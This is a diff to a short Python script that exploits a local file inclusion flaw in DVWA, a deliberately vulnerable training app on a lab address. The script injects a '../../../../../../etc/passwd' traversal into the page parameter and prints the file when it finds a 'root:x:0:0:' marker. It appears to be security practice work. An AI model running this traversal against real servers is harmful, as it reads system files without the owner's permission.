@@ -1,3 +1,8 @@
+"""
+Here is the URL we're testing on
+http://10.0.0.217/DVWA/vulnerabilities/fi/?page=include.php
+"""
+
 import requests
 
 # Need to use a cookie in order to get past admin page on DVWA, obviously this wouldn't happen in nature
@@ -12,6 +17,12 @@ mal_url = input_url.replace('include.php', '../../../../../../etc/passwd' )
 # Making our request with the now malicious URL
 mal_response = requests.get(mal_url, cookies=cookie)
 
-# Now printing the response
-print(mal_response.text)
 
+# Only printing if etc passwd was shown, and only printing that file
+if "root:x:0:0:" in mal_response.text:
+    print("VULNERABLE")
+
+    for line in mal_response.text.splitlines():
+        if "<!DOCTYPE html>" in line:
+            break
+        print(line)
